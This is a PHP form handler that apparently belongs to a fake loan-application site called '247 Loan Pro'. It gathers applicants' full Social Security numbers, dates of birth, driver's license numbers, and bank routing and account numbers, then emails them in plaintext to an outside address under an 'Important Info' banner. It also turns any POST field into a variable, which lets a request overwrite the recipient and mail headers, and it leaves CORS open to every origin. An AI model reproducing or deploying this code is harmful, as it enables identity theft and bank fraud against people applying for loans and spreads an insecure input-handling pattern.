<?php
header("Access-Control-Allow-Origin: *");
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header("Access-Control-Allow-Headers: Content-Type, Authorization");
if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Iterate over the POST data
    foreach ($_POST as $key => $value) {
        // Assign the value as the key in the $postData array
        ${$key} = $value;
    }

    // Compose email message
    $to = "submissions@247loanpro.site"; // Replace with your email address
    $subject = "Personal Loan Inquiry";
    $email_message = "What's the loan amount that works best for you? $loanAmount\n";
    $email_message .= "What is your name? $firstName $lastName\n";
    $email_message .= "What is your email? $email\n";
    $email_message .= "Verify last 4 digits of SSN $l4ssn\n";
    $email_message .= "Cell phone number $telNumber\n";
    $email_message .= "What is the best time to reach you? $time2Call\n";
    $email_message .= "What's your home address? $strAddress $city $state $zipCode\n";
    $email_message .= "What's your date of birth? $dob\n";
    $email_message .= "Do you have $10,000 or more in credit card debt? $currentDebts\n";
    $email_message .= "Do you have a car registered in your name? $registeredVehicle\n";
    $email_message .= "How long have you lived at your home? $residenceHistory\n";
    $email_message .= "Are you a home owner? $ownHome\n";
    $email_message .= "What's your gross monthly income? $monthlyIncome\n";
    $email_message .= "How frequently do you get paid? $monthlyIncomeFreq\n";
    $email_message .= "Are you an active-duty military member? $activeMilitary\n";
    $email_message .= "What's your current income source? $incomeSource\n";
    $email_message .= "What's the name of your employer? $employerName\n";
    $email_message .= "How long have you been employed? $employmentDuration\n";
    $email_message .= "What's your work phone number? $employerPhone\n";
    $email_message .= "What's your drivers license or state ID number? $driverStateID $driverState\n";
    $email_message .= "What's your social security number? $ssn\n";
    $email_message .= "What type of bank account do you have? $bankAccType\n";
    $email_message .= "How long have you had this bank account for? $bankAcctDuration\n";
    $email_message .= "Do you have direct deposit? $directDeposit\n";
    $email_message .= "What's your credit score? $creditScore\n";
    $email_message .= "What's your reason for requesting a loan? $loanReason\n";
    $email_message .= "Where would you like your loan deposited? $bankName $bankAba $bankAccNo\n";
    $email_message .= "====================Important Info=====================\n";
    $email_message .= "What is your name? $firstName $lastName\n";
    $email_message .= "What's your current income source? $incomeSource\n";
    $email_message .= "What's your gross monthly income? $monthlyIncome\n";
    $email_message .= "What's your home address? $strAddress $city $state $zipCode\n";
    $email_message .= "What is your email? $email\n";
    $email_message .= "Mobile or home phone number? $telNumber\n";
    $email_message .= "What's your drivers license or state ID number? $driverStateID $driverState\n";
    $email_message .= "What's your social security number? $ssn\n";
    $email_message .= "Bank Info? $bankName $bankAba $bankAccNo\n";

    // Send email
    $headers = "From: bjvcompanies@server1.jointdivisoncxvii.me\r\n";
    $message = "We have received your application and it is currently being reviewed by our team.\r\n" .
        "We acknowledge the importance of your request and assure you that we will process your application as soon as possible. If we require any additional information or documentation from you, we will reach out to you promptly.\r\n" .
        "Feel free to contact our customer support team at loans@247loanpro.site. We are here to assist you.\r\n" .
        "Thank you for choosing our services. We appreciate your trust and look forward to assisting you with your loan application.\r\n" .
        "247 Loan Pro\r\n";

    // Format the message for JSON entry
    $confirmation = base64_encode($message);
    if (mail($to, $subject, $email_message, $headers)) {
        echo json_encode(["message" => $confirmation]);
    } else {
        http_response_code(500);
        echo json_encode(["message" => "Failed to send the inquiry. Please try again later."]);
    }
} else {
    http_response_code(405);
    echo json_encode(["message" => "Method Not Allowed"]);
}


